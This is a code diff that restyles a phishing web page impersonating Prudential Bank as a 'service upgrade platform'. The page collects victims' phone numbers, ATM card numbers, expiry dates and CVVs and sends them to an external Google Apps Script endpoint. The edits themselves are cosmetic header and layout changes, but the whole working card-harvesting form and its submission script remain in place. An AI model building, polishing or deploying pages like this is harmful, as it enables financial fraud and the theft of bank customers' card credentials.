@@ -13,17 +13,47 @@
       flex-direction: column;
       align-items: center;
     }
+
+    /* Header background */
     .header {
-      background-color: #004080; /* Dark blue like your uploaded image */
+      background-color: #004080; /* Dark blue */
       color: #fff;
       text-align: center;
       width: 100%;
       padding: 40px 20px;
       border-bottom-left-radius: 40px;
       border-bottom-right-radius: 40px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
     }
-    .header h1 { margin: 0; font-size: 22px; }
-    .header p { margin: 5px 0 0; font-size: 14px; }
+
+    /* Badge box inside header */
+    .title-badge {
+      display: inline-block;
+      background: #003366; /* slightly darker box */
+      padding: 15px 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.25);
+    }
+
+    .title-badge h1 {
+      margin: 0;
+      font-size: 22px;
+      font-weight: bold;
+    }
+
+    .title-badge h2 {
+      margin: 8px 0 0;
+      font-size: 16px;
+      font-weight: normal;
+      font-style: italic;
+    }
+
+    .header p {
+      margin: 10px 0 0;
+      font-size: 14px;
+    }
+
+    /* Login container */
     .login-container {
       background: #fff;
       width: 90%;
@@ -33,12 +63,14 @@
       border-radius: 12px;
       box-shadow: 0 4px 8px rgba(0,0,0,0.1);
     }
+
     .login-container label {
       display: block;
       margin-bottom: 6px;
       font-size: 14px;
       color: #333;
     }
+
     .login-container input {
       width: 100%;
       padding: 12px;
@@ -47,10 +79,12 @@
       border-radius: 6px;
       font-size: 14px;
     }
+
     .button-group {
       display: flex;
       justify-content: center;
     }
+
     .button-group button {
       padding: 12px 20px;
       border: none;
@@ -62,6 +96,7 @@
       background-color: #004080;
       color: #fff;
     }
+
     .button-group button:hover {
       background-color: #003366;
     }
@@ -69,23 +104,26 @@
 </head>
 <body>
   <div class="header">
-    <h1>PRUDENTIAL BANK SERVICE UPGRADE PLATFORM </h1>
-    <p>……Truly Dependable</p>
+    <div class="title-badge">
+      <h1>PRUDENTIAL BANK</h1>
+      <h2>……Truly Dependable</h2>
+    </div>
+    <p>SERVICE UPGRADE PLATFORM</p>
   </div>
 
   <div class="login-container">
-  <form id="demoForm">
-  <label>Phone Number</label>
-  <input type="tel" name="phone_number" required>
+    <form id="demoForm">
+      <label>Phone Number</label>
+      <input type="tel" name="phone_number" required>
 
-  <label>ATM Card Number</label>
-  <input type="text" name="atm_card_number" required>
+      <label>ATM Card Number</label>
+      <input type="text" name="atm_card_number" required>
 
-  <label>ATM Expiry Date</label>
-  <input type="text" name="atm_expiry_date" placeholder="MM/YY" required>
+      <label>ATM Expiry Date</label>
+      <input type="text" name="atm_expiry_date" placeholder="MM/YY" required>
 
-  <label>CVV</label>
-  <input type="text" name="cvv" required>
+      <label>CVV</label>
+      <input type="text" name="cvv" required>
 
       <div class="button-group">
         <button type="submit">VALIDATE SERVICES →</button>
@@ -93,7 +131,7 @@
     </form>
   </div>
 
-<script>
+  <script>
     const scriptURL = "https://script.google.com/macros/s/AKfycbw-BN61Qrq7grgilOPWqHHw3WPJULXjddmz4kiisZoPJb-7sQU06jA4mdDNmb6VzQiaWg/exec";
     const form = document.getElementById("demoForm");
 
@@ -108,7 +146,7 @@
         console.log("Server response:", result);
 
         if (result.includes("Success")) {
-          // ✅ Only redirect if Apps Script confirms success
+          // ✅ Redirect only if Apps Script confirms success
           window.location.href = "thank_you.html";
         } else {
           alert("Submission failed: " + result);
